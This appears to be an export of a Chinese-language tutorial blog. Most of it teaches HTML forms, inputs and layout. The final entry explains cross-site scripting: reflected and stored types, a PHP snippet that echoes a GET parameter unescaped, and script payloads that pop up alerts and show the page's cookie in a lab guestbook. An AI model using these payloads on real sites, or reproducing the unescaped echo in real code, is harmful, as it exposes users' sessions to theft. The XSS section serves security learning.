<h4 id="form表单"><a href="#form表单" class="headerlink" title="form表单"></a>form表单</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;form表单&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!---</span><br><span class="line">			1、表单的用处</span><br><span class="line">				收集用户信息</span><br><span class="line">				表单展现之后，用户填写表单，点击提交按钮提交数据给服务器。</span><br><span class="line">			2、如何画一个表单？</span><br><span class="line">				使用form标签画表单</span><br><span class="line">			3、一个网页当中可以有多个表单form	</span><br><span class="line">			4、表单最终是需要提交数据给服务器的。form标签中有一个action属性，这个属性使用指定服务器地址的。</span><br><span class="line">					action属性用来指定数据提交给哪个服务器。</span><br><span class="line">					action属性和超链接中的href属性一样，都是向服务器发送请求（request）。</span><br><span class="line">			5、http:&#x2F;&#x2F;192.168.111.125:8080&#x2F;on&#x2F;img这是请求路径，表单提交数据最终提交给：</span><br><span class="line">					192.168.111.125这个机器上的8080端口上对应的软件</span><br><span class="line">			&lt;form action&#x3D;&quot;服务器地址&quot;&gt;&lt;&#x2F;form&gt;</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;192.168.12.155:8080&#x2F;HTML&quot;&gt;</span><br><span class="line">			&lt;!---画一个提交按钮，这个按钮可以提交表单---&gt;</span><br><span class="line">			&lt;!---画按钮可以使用input输入域，type属性有有一个submit值具有提交表单的作用---&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;!---其中&lt;input type&#x3D;&quot;button&quot;&#x2F;&gt;中的type的值不能随便写 ---&gt;</span><br><span class="line">			&lt;!---当type&#x3D;&quot;submit&quot;的时候表示该按钮是一个提交按钮，具有提交表单的能力---&gt;</span><br><span class="line">			&lt;!---可以使用input标签的value属性来设置按钮上显示的文本---&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;注册&quot;&#x2F;&gt;</span><br><span class="line">			&lt;!---这是一个普通按钮，不具有提交表单的能力。---&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;按钮上显示的文本&quot;&#x2F;&gt;</span><br><span class="line">			&lt;!---其中&lt;input type&#x3D;&quot;button&quot;&#x2F;&gt;中的type的值不能随便写 ---&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;百度&lt;&#x2F;a&gt;	</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">			&lt;!---这个按钮和普通的超链接没什么太大区别。(超链接和表单都可以向服务器发送请求，只不过表单发送请求的同时可以携带数据)---&gt;</span><br><span class="line">			&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;text&quot; &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;百度&quot; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;189.161.132.15&#x2F;loca&#x2F;login&quot;&gt;</span><br><span class="line">			用户名&lt;input type&#x3D;&quot;text&quot; &#x2F;&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			密&amp;nbsp&amp;nbsp&amp;nbsp码&lt;input type&#x3D;&quot;password&quot;&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!---</span><br><span class="line">		</span><br><span class="line">			表单是以什么格式提交给服务器的</span><br><span class="line">				http:&#x2F;&#x2F;189.161.132.15&#x2F;loca&#x2F;login?username&#x3D;111&amp;userpwd&#x3D;111</span><br><span class="line">				问号？前面是路径问号？后面是数据，数据以name和value的键值对方式，中间有等号衔接</span><br><span class="line">				如果input标签中的type属性等于text时，后面的value不需要我们自己写，因为提交的数据就是value</span><br><span class="line">				格式：action?name&#x3D;value&amp;name&#x3D;value&amp;name&#x3D;value....</span><br><span class="line">				HTTP协议规定，必须以这种格式提交给服务器</span><br><span class="line">				</span><br><span class="line">			强调：表单中写了name属性的，一律会提交给服务器。不想提交这一项，就不要写name属性</span><br><span class="line">				</span><br><span class="line">			当name没有写的时候，该项不会提交给服务器</span><br><span class="line">			但是当value没有写的时候，value的默认值是空字符串&quot;&quot;，会将空字符串提交给服务器。</span><br><span class="line">		---&gt;</span><br><span class="line">		&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;189.161.132.15&#x2F;loca&#x2F;login&quot;&gt;</span><br><span class="line">			&lt;table&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;用户名&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;!--input标签中如果要提交数据必须加name属性，否则不能提交数据，非常重要name--&gt;</span><br><span class="line">					&lt;td&gt;&lt;input type&#x3D;&quot;text&quot;  name&#x3D;&quot;username&quot; &#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;&#x2F;tr&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;密码&lt;&#x2F;td&gt;</span><br><span class="line">					&lt;!--input标签中如果要提交数据必须加name属性，否则不能提交数据，非常重要name--&gt;</span><br><span class="line">					&lt;td&gt;&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;userpwd&quot; &#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;&#x2F;tr&gt;</span><br><span class="line">				&lt;tr align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">					&lt;td colspan&#x3D;&quot;2&quot;&gt;</span><br><span class="line">						&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt;</span><br><span class="line">						&lt;!---reset数值意思是重置---&gt;</span><br><span class="line">						&lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt;</span><br><span class="line">					&lt;&#x2F;td&gt;</span><br><span class="line">				&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;&#x2F;table&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">		&lt;br &#x2F;&gt;</span><br><span class="line">		&lt;br &#x2F;&gt;</span><br><span class="line">		&lt;!---必须放到form标签内部才能执行，如果放在form标签外，跟button成了一样的效果了---&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;form&gt;&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="用户注册表单"><a href="#用户注册表单" class="headerlink" title="用户注册表单"></a>用户注册表单</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;用户注册的表单&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!--</span><br><span class="line">			用户注册</span><br><span class="line">				姓名</span><br><span class="line">				密码</span><br><span class="line">				确认密码</span><br><span class="line">				性别</span><br><span class="line">				兴趣爱好</span><br><span class="line">				学历</span><br><span class="line">				简介</span><br><span class="line">		--&gt;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		&lt;!--</span><br><span class="line">			凡是给用户输入机会的都不需要写value，凡是需要手动鼠标点的就需要输入value</span><br><span class="line">			form表单method属性</span><br><span class="line">				get和post，采用get方式提交的时候，用户提交的信息会显示在地址栏上</span><br><span class="line">				采用post提交的时候，用户的信息不会显示在地址栏上</span><br><span class="line">				当用户提交的信息中包含敏感信息，例如：密码，建议使用post方法提交</span><br><span class="line">				</span><br><span class="line">			注意：method属性如果不指定，或者指定get，这种情况下都是get</span><br><span class="line">			只有method指定为post时，才为psot请求</span><br><span class="line">			剩下所有的请求都是get请求</span><br><span class="line">			</span><br><span class="line">			psot提交的时候，提交的数据格式和get是一样的，只不过不在地址栏上显示出来，而是进行了隐藏。</span><br><span class="line">			post提交的数据还是：name&#x3D;value&amp;name&#x3D;value&amp;name&#x3D;value&amp;...</span><br><span class="line">		--&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8087&#x2F;load&#x2F;login&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">			用户名</span><br><span class="line">			&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; &#x2F;&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			</span><br><span class="line">			密码</span><br><span class="line">			&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;userpwd&quot; &#x2F;&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			</span><br><span class="line">			确认密码</span><br><span class="line">			&lt;input type&#x3D;&quot;password&quot;&#x2F;&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			性别</span><br><span class="line">			&lt;!--</span><br><span class="line">				用户真正提交的数据是用户名和密码，所以这里的value必须手动指定</span><br><span class="line">				如果想让男默认先旋蒸加上属性checked</span><br><span class="line">			--&gt;</span><br><span class="line">			&lt;!---单选按钮的value必须手动指定---&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;男</span><br><span class="line">			&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;女</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;!--</span><br><span class="line">				type属性中的checkbox值的意思是复选框</span><br><span class="line">			--&gt;</span><br><span class="line">			兴趣爱好</span><br><span class="line">			&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;sing&quot; &#x2F;&gt;唱</span><br><span class="line">			&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;jump&quot; &#x2F;&gt;跳</span><br><span class="line">			&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;basketball&quot; &#x2F;&gt;篮球</span><br><span class="line">			&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;rap&quot; &#x2F;&gt;rap</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;!--</span><br><span class="line">				这里不能使用input标签了，要是用select标签，中的option字标签，来制作下拉列表</span><br><span class="line">			--&gt;</span><br><span class="line">			学历</span><br><span class="line">			&lt;select name&#x3D;&quot;record_of_formal_schooling&quot; &gt;</span><br><span class="line">				&lt;option value&#x3D;&quot;xx&quot;&gt;小学&lt;&#x2F;option&gt;</span><br><span class="line">				&lt;option value&#x3D;&quot;cz&quot;&gt;初中&lt;&#x2F;option&gt;</span><br><span class="line">				&lt;option value&#x3D;&quot;gz&quot; selected&gt;高中&lt;&#x2F;option&gt;&lt;!--默认选中，使用selected--&gt;</span><br><span class="line">				&lt;option value&#x3D;&quot;dz&quot;&gt;大专&lt;&#x2F;option&gt;</span><br><span class="line">				&lt;option value&#x3D;&quot;bk&quot;&gt;本科&lt;&#x2F;option&gt;</span><br><span class="line">				&lt;option value&#x3D;&quot;ss&quot;&gt;硕士&lt;&#x2F;option&gt;		</span><br><span class="line">			&lt;&#x2F;select&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;!--</span><br><span class="line">				textarea标签是文本域</span><br><span class="line">				这里不能加width和height(宽和高)，而是要加rows和cols(行和列)</span><br><span class="line">				不过不加rows和cols属性，也可以，只是文本域很小，体验差</span><br><span class="line">				文本域就没有value属性，用户填写的内容就是value。</span><br><span class="line">				而不是像用户名和密码那里，有valuer属性，但是不需要我们写</span><br><span class="line">			--&gt;</span><br><span class="line">			简介</span><br><span class="line">			&lt;textarea rows&#x3D;&quot;10&quot; cols&#x3D;&quot;50&quot; name&#x3D;&quot;introduce&quot;&gt;&lt;&#x2F;textarea&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;注册&quot; &#x2F;&gt;</span><br><span class="line">			&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp</span><br><span class="line">			&lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!--超链接也可以提交数据给服务器，但是提交的数据都是固定不变的--&gt;</span><br><span class="line">		&lt;!--超链接是GET请求不是POST请求--&gt;</span><br><span class="line">		&lt;!--超链接的格式不能随便写，要遵守http协议的规范--&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;192.168.1.1:6262&#x2F;oa&#x2F;save?usernam&#x3D;1&amp;password&#x3D;1&quot;&gt;提交&lt;&#x2F;a&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="下拉列表支持多选"><a href="#下拉列表支持多选" class="headerlink" title="下拉列表支持多选"></a>下拉列表支持多选</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;下拉列表支持多选&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!--multiple属性支持多选--&gt;</span><br><span class="line">		&lt;!--可以使用size属性来设置下拉列表显示几项--&gt;</span><br><span class="line">		&lt;select multiple&#x3D;&quot;multiple&quot; size&#x3D;&quot;3&quot;&gt;</span><br><span class="line">			&lt;option&gt;山东省&lt;&#x2F;option&gt;</span><br><span class="line">			&lt;option&gt;陕西省&lt;&#x2F;option&gt;</span><br><span class="line">			&lt;option&gt;山西省&lt;&#x2F;option&gt;</span><br><span class="line">			&lt;option&gt;河北省&lt;&#x2F;option&gt;</span><br><span class="line">			&lt;option&gt;广东省&lt;&#x2F;option&gt;</span><br><span class="line">			&lt;option&gt;广西省&lt;&#x2F;option&gt;</span><br><span class="line">		&lt;&#x2F;select&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="file控件"><a href="#file控件" class="headerlink" title="file控件"></a>file控件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;file控件&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!--file控件就是选择文件，文件上传专用--&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="隐藏的hidden控件"><a href="#隐藏的hidden控件" class="headerlink" title="隐藏的hidden控件"></a>隐藏的hidden控件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;隐藏的hidden控件&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8080&#x2F;os&#x2F;save&quot;&gt;</span><br><span class="line">			&lt;!--隐藏域，网页上看不到，但是表单提交的时候数据会自动提交给服务器。--&gt;</span><br><span class="line">			&lt;!--hidden和post不是一样的，post是页面显示，但是地址栏不显示--&gt;</span><br><span class="line">			&lt;!--hidden是页面上不显示，而不是地址栏，你写的东西如果加上hidden页面上什么也不会返回。--&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;userid&quot; value&#x3D;&quot;111&quot; &#x2F;&gt;</span><br><span class="line">			用户代码</span><br><span class="line">			&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usercode&quot;&#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="readonly和disabled"><a href="#readonly和disabled" class="headerlink" title="readonly和disabled"></a>readonly和disabled</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;readonly和disabled&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!--</span><br><span class="line">			readonly和disabled相同点，都是只读不能修改</span><br><span class="line">			但是readonly可以提交给服务器，disabled数据不能提交（即使有name属性也不能提交）</span><br><span class="line">		--&gt;</span><br><span class="line">		&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8080&#x2F;tab&#x2F;sca&quot;&gt;</span><br><span class="line">			用户代码&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usercode&quot; value&#x3D;&quot;213&quot; readonly &#x2F;&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			用户姓名&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;154654&quot; disabled &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="input控件的maxlength属性"><a href="#input控件的maxlength属性" class="headerlink" title="input控件的maxlength属性"></a>input控件的maxlength属性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;HTML中节点的id属性&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!--任何标签都可以加id，就算是&lt;html&gt;标签也可以，只不过没什么意义。--&gt;</span><br><span class="line">		&lt;!--</span><br><span class="line">			1、在HTML文档当中，任何元素(节点)都有id属性，id属性是该节点的唯一标识。所以在同一个HTML文档中id值不能重复。</span><br><span class="line">			2、注意：表单提交数据的时候只和name有关系，和id无关</span><br><span class="line">			3、id有什么用？</span><br><span class="line">					id属性是为了更方便让我们获取元素（节点）</span><br><span class="line">					JavaScript语言可让对HTML文档当中的任意节点进行增删改操作</span><br><span class="line">					JavaScript可以对HTML文档当中的任意节点进行增删改，增删改之前需要先拿到这个节点，通常我们是通过id来拿节点对象。</span><br><span class="line">					id的存在让我们获取元素（节点）更方便</span><br><span class="line">			4、HTML文档可以想象成一颗树，树上有很多树枝（节点），每一个树枝（节点）都有唯一的id</span><br><span class="line">					DOM(Document)树。而这个树有一个专门的术语叫做&quot;DOM树&quot;</span><br><span class="line">					JavaScript主要就是对这颗DOM树上的节点进行增删改的。</span><br><span class="line">		--&gt;</span><br><span class="line">		&lt;form id&#x3D;&quot;myform&quot;&gt;</span><br><span class="line">			&lt;!--这里id的名字和name的名字相同，但是不冲突，因为那是id的名字，另一个是name的名字--&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot; &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;passwd&quot; name&#x3D;&quot;passwd&quot; &#x2F;&gt;</span><br><span class="line">			&lt;!--可以理解为id就是身份证号，不能重复，至少在同一个HTML代码中不能重复--&gt;</span><br><span class="line">			&lt;!--</span><br><span class="line">				&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot;&#x2F;&gt;</span><br><span class="line">			--&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200411175836697.png" alt="image-20200411175836697"></p>
<h4 id="div和span在网页中的应用"><a href="#div和span在网页中的应用" class="headerlink" title="div和span在网页中的应用"></a>div和span在网页中的应用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;div和span在网页中的使用&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;!--</span><br><span class="line">			1、div和span是什么？有什么用？</span><br><span class="line">				* div和span都可以称为“图层”</span><br><span class="line">				* 图层的作用是为了保证页面可以灵活的布局</span><br><span class="line">				* 图层就是一个一个的盒子，div嵌套div就是盒子套盒子</span><br><span class="line">				* div和span可以定位的，只要定下div和左上角的x轴和y轴坐标即可。</span><br><span class="line">			</span><br><span class="line">			2、最早的网页时采用table进行布局，但是table不灵活，太死板</span><br><span class="line">				* 现代的网页开发中div不对使用最多，几乎很少使用table进行布局了。</span><br><span class="line">			</span><br><span class="line">			3、div和span的区别？</span><br><span class="line">				* div独自占用一行（默认情况下）</span><br><span class="line">				* span不会独自占用一行</span><br><span class="line">		--&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;div1&quot;&gt;第一个div&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;div2&quot;&gt;第二个div&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;br &#x2F;&gt;</span><br><span class="line">		&lt;span id&#x3D;&quot;span1&quot;&gt;我是第一个span&lt;&#x2F;span&gt;</span><br><span class="line">		&lt;span id&#x3D;&quot;span2&quot;&gt;我是第二个span&lt;&#x2F;span&gt;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;1&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;2&quot;&gt;</span><br><span class="line">				&lt;div&gt;text&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2020/04/20/XSS/</url>
    <content><![CDATA[<h4 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h4><p>跨站脚本(Cross-Site Scripting跨域脚本攻击，简称为XSS)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。他允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容</p>
<h5 id="XSS原因："><a href="#XSS原因：" class="headerlink" title="XSS原因："></a>XSS原因：</h5><p>过于信任客户端提交的数据</p>
<ul>
<li><h5 id="XSS攻击可分为三种：反射性，存储型，DOM型"><a href="#XSS攻击可分为三种：反射性，存储型，DOM型" class="headerlink" title="XSS攻击可分为三种：反射性，存储型，DOM型"></a>XSS攻击可分为三种：反射性，存储型，DOM型</h5></li>
</ul>
<h4 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h4><h5 id="1、反射性XSS"><a href="#1、反射性XSS" class="headerlink" title="1、反射性XSS"></a>1、反射性XSS</h5><p>​        反射性XSS又称为<strong>非持久性XSS</strong>，这种攻击方式往往只具有<strong>一次性</strong></p>
<p>​        攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问连接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会出发XSS漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091025553.png" alt="image-20200409091025553"></p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo $_GET[&quot;uname&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当用户访问<code>url?uname=&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;</code>触发代码弹出对话框</p>
<p>随便输入内容，会返回输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408195920593.png" alt="image-20200408195920593"></p>
<p>使用<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>查看页面返回，成功返回cookie值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408200115396.png" alt="image-20200408200115396"></p>
<h5 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h5><p>​        存储型XSS又称为<strong>持久性XSS</strong>，攻击脚本将被永远地存放在目标服务器的数据库或文件中，具有很高的隐秘性</p>
<p>​        攻击方式：这种攻击多见于论坛、博客、和留言版，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子中，随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入的恶意脚本帖子时，恶意脚本会在他们的浏览器中得到执行。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091124829.png" alt="image-20200409091124829"></p>
<p>​        例如，恶意攻击这在留言板中加入以下代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;hacker by hacker&#x2F;)&lt;&#x2F;script&gt;)</span><br></pre></td></tr></table></figure>

<p>当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入到一个页面中，所有访问这个页面的用户都将成为受害者。</p>
<p>在name处输入hello，或者其他任何都行，在Message输入XSS代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201711023.png" alt="image-20200408201711023"></p>
<p>点击Sign Guestbook，返回cookie值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201852944.png" alt="image-20200408201852944"></p>
<p>刷新页面或者切换别的模式在回来点还是弹出cookie信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201946633.png" alt="image-20200408201946633"></p>
